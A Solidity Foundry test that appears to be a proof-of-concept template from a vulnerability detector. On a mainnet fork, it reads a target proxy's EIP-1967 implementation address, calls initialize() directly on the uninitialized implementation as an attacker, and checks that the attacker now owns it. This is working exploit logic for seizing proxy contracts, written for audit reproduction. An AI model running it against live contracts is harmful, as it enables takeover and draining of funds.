// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Uninitialized implementation behind a proxy
/// @notice Detector: unprotected-initializer / bytecode-proxy. The proxy
///         delegates to an implementation that was NEVER initialized, so
///         ANYONE can call initialize() on the implementation DIRECTLY
///         (bypassing the proxy) and become its owner -- then upgrade the
///         proxy or drain it.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Reads the EIP-1967 implementation slot.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // EIP-1967 implementation slot: keccak256("eip1967.proxy.implementation") - 1
    bytes32 public constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        address impl = address(uint160(uint256(vm.load(target, IMPLEMENTATION_SLOT))));
        console.log("implementation:", impl);
        require(impl != address(0), "no EIP-1967 implementation slot -- not a standard proxy");

        // Initialize the implementation DIRECTLY, not through the proxy.
        // TODO: adapt the initialize signature to the implementation.
        vm.prank(attackerEOA);
        (bool ok,) = impl.call(
            abi.encodeWithSignature("initialize(address)", attackerEOA)
        );
        require(ok, "initialize(address) on implementation failed -- adapt the signature");

        (bool ownerOk, bytes memory ret) =
            impl.staticcall(abi.encodeWithSignature("owner()"));
        require(ownerOk, "implementation has no owner() view -- adapt the ownership check");
        address owner_ = abi.decode(ret, (address));
        console.log("implementation owner after direct initialize:", owner_);
        assertEq(owner_, attackerEOA, "exploit did not reproduce: attacker is not implementation owner");
    }
}
